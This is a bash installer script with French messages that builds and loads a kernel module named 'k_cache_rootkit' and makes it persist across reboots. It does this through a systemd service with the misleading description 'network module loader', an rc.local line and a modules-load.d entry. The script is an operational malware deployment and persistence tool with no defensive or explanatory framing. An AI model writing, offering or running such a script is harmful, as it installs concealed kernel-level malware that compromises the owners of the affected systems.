#!/bin/bash

if [ "$(id -u)" -ne 0 ]; then
    echo "Ce script doit être exécuté en tant que root" >&2
    exit 1
fi

PROJECT_DIR=$(pwd)
MODULE_NAME="k_cache_rootkit"

make all

if [ ! -f "${MODULE_NAME}.ko" ]; then
    echo "Erreur: La compilation a échoué" >&2
    exit 1
fi

if lsmod | grep -q "$MODULE_NAME"; then
    rmmod "$MODULE_NAME" 2>/dev/null
fi

insmod "${MODULE_NAME}.ko"

MODULE_DEST="/lib/modules/$(uname -r)/extra"
mkdir -p "$MODULE_DEST"
cp "${MODULE_NAME}.ko" "$MODULE_DEST/"

depmod -a

cat > /etc/systemd/system/k_cache_load.service << EOF
[Unit]
Description=Chargeur de module réseau
After=network.target

[Service]
Type=oneshot
ExecStart=/sbin/insmod ${MODULE_DEST}/${MODULE_NAME}.ko
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
EOF

if [ ! -f /etc/rc.local ]; then
    echo '#!/bin/bash' > /etc/rc.local
    echo 'exit 0' >> /etc/rc.local
    chmod +x /etc/rc.local
fi

if ! grep -q "${MODULE_DEST}/${MODULE_NAME}.ko" /etc/rc.local; then
    sed -i "/exit 0/i /sbin/insmod ${MODULE_DEST}/${MODULE_NAME}.ko" /etc/rc.local
fi

echo "$MODULE_NAME" > /etc/modules-load.d/k_cache.conf

systemctl enable k_cache_load.service

echo "Installation terminée"



